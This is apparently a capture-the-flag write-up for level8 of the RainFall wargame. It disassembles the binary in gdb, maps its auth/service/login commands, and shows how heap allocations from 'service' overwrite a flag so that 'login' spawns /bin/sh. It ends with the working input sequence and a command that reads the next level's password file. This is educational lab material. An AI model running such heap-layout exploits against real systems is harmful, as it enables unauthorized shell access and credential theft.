# Way to level9

When we enter the shell `level8`, we can see the `level8` executable file.

We can download it via the `scp` command.
```bash
bash-5.3$ scp -P 4242 level8@10.171.55.141:level8 .
```
Or we can check how it works with the `gdb` command.
```gdb
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	push   %edi
   0x08048568 <+4>:	push   %esi
   0x08048569 <+5>:	and    $0xfffffff0,%esp
   0x0804856c <+8>:	sub    $0xa0,%esp
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    0x8049ab0,%ecx
   0x0804857b <+23>:	mov    0x8049aac,%edx
   0x08048581 <+29>:	mov    $0x8048810,%eax
   0x08048586 <+34>:	mov    %ecx,0x8(%esp)
   0x0804858a <+38>:	mov    %edx,0x4(%esp)
   0x0804858e <+42>:	mov    %eax,(%esp)
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   0x08048596 <+50>:	mov    0x8049a80,%eax
   0x0804859b <+55>:	mov    %eax,0x8(%esp)
   0x0804859f <+59>:	movl   $0x80,0x4(%esp)
   0x080485a7 <+67>:	lea    0x20(%esp),%eax
   0x080485ab <+71>:	mov    %eax,(%esp)
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>
   0x080485b3 <+79>:	test   %eax,%eax
   0x080485b5 <+81>:	je     0x804872c <main+456>
   0x080485bb <+87>:	lea    0x20(%esp),%eax
   0x080485bf <+91>:	mov    %eax,%edx
   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080485d1 <+109>:	seta   %dl
   0x080485d4 <+112>:	setb   %al
   0x080485d7 <+115>:	mov    %edx,%ecx
   0x080485d9 <+117>:	sub    %al,%cl
   0x080485db <+119>:	mov    %ecx,%eax
   0x080485dd <+121>:	movsbl %al,%eax
   0x080485e0 <+124>:	test   %eax,%eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>
   0x080485e4 <+128>:	movl   $0x4,(%esp)
   0x080485eb <+135>:	call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:	mov    %eax,0x8049aac
   0x080485f5 <+145>:	mov    0x8049aac,%eax
   0x080485fa <+150>:	movl   $0x0,(%eax)
   0x08048600 <+156>:	lea    0x20(%esp),%eax
   0x08048604 <+160>:	add    $0x5,%eax
   0x08048607 <+163>:	movl   $0xffffffff,0x1c(%esp)
   0x0804860f <+171>:	mov    %eax,%edx
   0x08048611 <+173>:	mov    $0x0,%eax
   0x08048616 <+178>:	mov    0x1c(%esp),%ecx
   0x0804861a <+182>:	mov    %edx,%edi
   0x0804861c <+184>:	repnz scas %es:(%edi),%al
   0x0804861e <+186>:	mov    %ecx,%eax
   0x08048620 <+188>:	not    %eax
   0x08048622 <+190>:	sub    $0x1,%eax
   0x08048625 <+193>:	cmp    $0x1e,%eax
   0x08048628 <+196>:	ja     0x8048642 <main+222>
   0x0804862a <+198>:	lea    0x20(%esp),%eax
   0x0804862e <+202>:	lea    0x5(%eax),%edx
   0x08048631 <+205>:	mov    0x8049aac,%eax
   0x08048636 <+210>:	mov    %edx,0x4(%esp)
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:	lea    0x20(%esp),%eax
   0x08048646 <+226>:	mov    %eax,%edx
   0x08048648 <+228>:	mov    $0x804881f,%eax
   0x0804864d <+233>:	mov    $0x5,%ecx
   0x08048652 <+238>:	mov    %edx,%esi
   0x08048654 <+240>:	mov    %eax,%edi
   0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x08048658 <+244>:	seta   %dl
   0x0804865b <+247>:	setb   %al
   0x0804865e <+250>:	mov    %edx,%ecx
   0x08048660 <+252>:	sub    %al,%cl
   0x08048662 <+254>:	mov    %ecx,%eax
   0x08048664 <+256>:	movsbl %al,%eax
   0x08048667 <+259>:	test   %eax,%eax
   0x08048669 <+261>:	jne    0x8048678 <main+276>
   0x0804866b <+263>:	mov    0x8049aac,%eax
   0x08048670 <+268>:	mov    %eax,(%esp)
   0x08048673 <+271>:	call   0x8048420 <free@plt>
   0x08048678 <+276>:	lea    0x20(%esp),%eax
   0x0804867c <+280>:	mov    %eax,%edx
   0x0804867e <+282>:	mov    $0x8048825,%eax
   0x08048683 <+287>:	mov    $0x6,%ecx
   0x08048688 <+292>:	mov    %edx,%esi
   0x0804868a <+294>:	mov    %eax,%edi
   0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804868e <+298>:	seta   %dl
   0x08048691 <+301>:	setb   %al
   0x08048694 <+304>:	mov    %edx,%ecx
   0x08048696 <+306>:	sub    %al,%cl
   0x08048698 <+308>:	mov    %ecx,%eax
   0x0804869a <+310>:	movsbl %al,%eax
   0x0804869d <+313>:	test   %eax,%eax
   0x0804869f <+315>:	jne    0x80486b5 <main+337>
   0x080486a1 <+317>:	lea    0x20(%esp),%eax
   0x080486a5 <+321>:	add    $0x7,%eax
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    %eax,0x8049ab0
   0x080486b5 <+337>:	lea    0x20(%esp),%eax
   0x080486b9 <+341>:	mov    %eax,%edx
   0x080486bb <+343>:	mov    $0x804882d,%eax
   0x080486c0 <+348>:	mov    $0x5,%ecx
   0x080486c5 <+353>:	mov    %edx,%esi
   0x080486c7 <+355>:	mov    %eax,%edi
   0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080486cb <+359>:	seta   %dl
   0x080486ce <+362>:	setb   %al
   0x080486d1 <+365>:	mov    %edx,%ecx
   0x080486d3 <+367>:	sub    %al,%cl
   0x080486d5 <+369>:	mov    %ecx,%eax
   0x080486d7 <+371>:	movsbl %al,%eax
   0x080486da <+374>:	test   %eax,%eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>
   0x080486e2 <+382>:	mov    0x8049aac,%eax
   0x080486e7 <+387>:	mov    0x20(%eax),%eax
   0x080486ea <+390>:	test   %eax,%eax
   0x080486ec <+392>:	je     0x80486ff <main+411>
   0x080486ee <+394>:	movl   $0x8048833,(%esp)
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
   0x080486fa <+406>:	jmp    0x8048574 <main+16>
   0x080486ff <+411>:	mov    0x8049aa0,%eax
   0x08048704 <+416>:	mov    %eax,%edx
   0x08048706 <+418>:	mov    $0x804883b,%eax
   0x0804870b <+423>:	mov    %edx,0xc(%esp)
   0x0804870f <+427>:	movl   $0xa,0x8(%esp)
   0x08048717 <+435>:	movl   $0x1,0x4(%esp)
   0x0804871f <+443>:	mov    %eax,(%esp)
   0x08048722 <+446>:	call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:	jmp    0x8048574 <main+16>
   0x0804872c <+456>:	nop
   0x0804872d <+457>:	mov    $0x0,%eax
   0x08048732 <+462>:	lea    -0x8(%ebp),%esp
   0x08048735 <+465>:	pop    %esi
   0x08048736 <+466>:	pop    %edi
   0x08048737 <+467>:	pop    %ebp
   0x08048738 <+468>:	ret    
End of assembler dump.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080483c4  _init
0x08048410  printf
0x08048410  printf@plt
0x08048420  free
0x08048420  free@plt
0x08048430  strdup
0x08048430  strdup@plt
0x08048440  fgets
0x08048440  fgets@plt
0x08048450  fwrite
0x08048450  fwrite@plt
0x08048460  strcpy
0x08048460  strcpy@plt
0x08048470  malloc
0x08048470  malloc@plt
0x08048480  system
0x08048480  system@plt
0x08048490  __gmon_start__
0x08048490  __gmon_start__@plt
0x080484a0  __libc_start_main
0x080484a0  __libc_start_main@plt
0x080484b0  _start
0x080484e0  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048564  main
0x08048740  __libc_csu_init
0x080487b0  __libc_csu_fini
0x080487b2  __i686.get_pc_thunk.bx
0x080487c0  __do_global_ctors_aux
0x080487ec  _fini

```

There are no suspicious functions here. We are going to dig deeper into it.

## The command dispatcher

`main` runs an endless loop. On each turn it reads one line with `fgets` (up to `0x80` bytes
into a stack buffer at `0x20(%esp)`), then runs that line through a chain of inline comparisons.
Each comparison is the same shape: a fixed string address is loaded, `ecx` is set to the length
to check, and `repz cmpsb` compares the two memory blocks.

What is `repz cmpsb`? It compares two memory blocks byte by byte for up to `ECX` bytes, and
stops early on a mismatch (either `ECX` reaches `0` or a byte differs). The original source almost
certainly used `memcmp` here.

The two instructions that follow deserve a careful read, because they are easy to misread:

```asm
seta   %dl        ; dl = 1 if (unsigned) left > right, else 0
setb   %al        ; al = 1 if (unsigned) left < right, else 0
mov    %edx,%ecx
sub    %al,%cl    ; cl = dl - al  ->  +1 / 0 / -1  (the memcmp result)
mov    %ecx,%eax
movsbl %al,%eax   ; sign-extend THAT RESULT, not the compared byte
test   %eax,%eax
```

`seta`/`setb` turn the unsigned comparison into a three-valued result (`-1`, `0`, `1`), and
`movsbl` sign-extends that result — not the compared byte itself. So `test %eax,%eax` is zero only
when the prefix matched exactly, which is the "command recognized" case.

The fixed strings used by the dispatcher:

```gdb
(gdb) x/s 0x8048819
0x8048819:	 "auth "
(gdb) x/s 0x804881f
0x804881f:	 "reset"
(gdb) x/s 0x8048825
0x8048825:	 "service"
(gdb) x/s 0x804882d
0x804882d:	 "login"
(gdb) x/s 0x8048833
0x8048833:	 "/bin/sh"
```

```gdb
(gdb) x/5c 0x8048819
0x8048819:	97 'a'	117 'u'	116 't'	104 'h'	32 ' '
(gdb) x/5c 0x804882d
0x804882d:	108 'l'	111 'o'	103 'g'	105 'i'	110 'n'
(gdb) x/5c 0x8048833
0x8048833:	47 '/'	98 'b'	105 'i'	110 'n'	47 '/'
(gdb) x/5c 0x8048825
0x8048825:	115 's'	101 'e'	114 'r'	118 'v'	105 'i'
(gdb) x/5c 0x804881f
0x804881f:	114 'r'	101 'e'	115 's'	101 'e'	116 't'
```

Note that `"auth "` ends with a trailing space (`0x20`), so the compared prefix is 5 bytes.

## The command table

| Command | Prefix len | What it does |
|---------|-----------|--------------|
| `auth ` | 5 (`"auth "`) | `malloc(4)`, store the pointer in the global `0x8049aac`, zero the first 4 bytes. Then it checks `strlen(input+5) <= 30` (`repnz scas` + `cmp $0x1e`) and does `strcpy(auth_ptr, input+5)`. **Not used by the attack.** |
| `reset` | 5 | `free(auth_ptr)` |
| `service` | 6 | `strdup(input+7)`, store the pointer in the global `0x8049ab0` |
| `login` | 5 | falls through into the win check below |

There are three globals in play:

- `0x8049aac` — the `auth` pointer (the one the win check reads from)
- `0x8049ab0` — the `service` pointer
- `0x8049aa0` — the stream used by the `fwrite` that prints `"Password:\n"`

At the top of each loop, `printf` prints the `auth` and `service` globals as `%p, %p`, which is
exactly the feedback we need to watch the heap.

## The win condition

The block at `main+382` is the whole game:

```gdb
0x080486e2 <+382>:	mov    0x8049aac,%eax   ; eax = auth_ptr
0x080486e7 <+387>:	mov    0x20(%eax),%eax   ; eax = *(auth_ptr + 0x20)
0x080486ea <+390>:	test   %eax,%eax
0x080486ec <+392>:	je     0x80486ff <main+411>   ; zero -> just print "Password:"
0x080486ee <+394>:	movl   $0x8048833,(%esp)       ; "/bin/sh"
0x080486f5 <+401>:	call   0x8048480 <system@plt>  ; win
```

After `login`, the program reads the 4-byte dword at `*(auth_ptr + 0x20)`. If it is non-zero it
calls `system("/bin/sh")`. That dword is effectively the session's "authenticated" flag. The
attack is simply: **make that dword non-zero.**

## Thinking it through

Running `auth ` and then `login` is the obvious first try, and it fails:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
login
Password:
0x804a008, (nil) 
```

It doesn't work, because `auth` only ever zeroes the dword it allocates, and the flag at
`auth_ptr + 0x20` is still `0`.

So let's reason about the single win condition, `*(auth_ptr + 0x20) != 0`:

- `auth ` does `malloc(4)`, so the allocation is only 4 bytes wide. Offset `0x20` is well outside
  that chunk — nothing the `auth` command itself writes can ever reach it.
- We therefore need something *else* to end up placing non-zero bytes at `auth_ptr + 0x20`.
- The only command that repeatedly allocates on the heap is `service`, which calls `strdup`.
  (The `strcpy`/`strlen` machinery under `auth` is a side branch we never use.)
- So the plan is to allocate more heap chunks with `service` until one of them lands exactly at
  `auth_ptr + 0x20`.

Now measure the spacing with gdb. The `%p, %p` printout already shows it: the `auth` chunk is at
`0x804a008`, the first `service` chunk at `0x804a018`, the next at `0x804a028` — each allocation is
`0x10` apart (the glibc minimum chunk: header + alignment).

`0x20 / 0x10 = 2`, so the **second** `strdup` chunk lands precisely at `auth_ptr + 0x20`. If that
chunk holds a non-empty string, its first byte is non-zero — and the flag is forged.

## Heap layout

```
0x804a008  auth malloc(4)   <- auth_ptr (global 0x8049aac); flag is read at +0x20
0x804a018  1st strdup       (+0x10)
0x804a028  2nd strdup       (+0x10)  == auth_ptr + 0x20   <- target
```

The first `service` grabs `0x804a018`; the second `service` (the one carrying real content)
lands on `0x804a028`, which is `auth_ptr + 0x20`.

## Verification

```gdb
Starting program: /home/user/level8/level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service123456789abcdef
0x804a008, 0x804a028 
login

Breakpoint 1, 0x080486e2 in main ()
(gdb) x/x 0x8049aac
0x8049aac <auth>:       0x0804a008
(gdb) x/x 0x8049ab0
0x8049ab0 <service>:    0x0804a028
(gdb) p/x $eax
$1 = 0x0
(gdb) stepi
0x080486e7 in main ()
(gdb) x/s *(0x804a028)
0x34333231:      <Address 0x34333231 out of bounds>
(gdb) x/s 0x804a028
0x804a028:       "123456789abcdef\n"
(gdb) 
```

Reading the logs:

- `x/x 0x8049aac` → `0x804a008`, so `auth_ptr = 0x804a008`.
- `x/x 0x8049ab0` → `0x804a028`, the second `strdup` chunk.
- `auth_ptr + 0x20 = 0x804a008 + 0x20 = 0x804a028`, which is exactly that second chunk.
- `x/s 0x804a028` → `"123456789abcdef\n"`, so `*(auth_ptr + 0x20) = "1234" = 0x34333231 != 0`.

The flag dword is non-zero, so `login` takes the `system("/bin/sh")` branch.

## Exploit

Feed the commands in order — `auth `, one empty `service` (to burn the `0x804a018` chunk), a
second `service` carrying content (which lands on `auth_ptr + 0x20`), then `login`:

```bash
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service123456789abcdef
0x804a008, 0x804a028 
login
$ whoami
level9
$ cat /home/user/level9/.pass
result...
```
